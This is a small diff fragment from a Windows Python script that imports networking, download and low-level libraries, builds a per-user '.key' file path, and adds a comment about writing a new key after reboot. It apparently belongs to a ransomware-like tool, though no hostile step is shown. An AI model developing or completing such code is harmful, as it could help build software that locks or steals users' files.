@@ -9,6 +9,7 @@ import os, sys, socket, wget, struct, ctypes, shutil, base64
 letter_drive = os.environ["SystemDrive"]
 current_user = os.environ["USERNAME"]
 
+# PATH TO WRITE THE NEW KEY AFTER REBOOT
 usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive, current_user, current_user)
 
 # GENERATE KEY FUNCTION
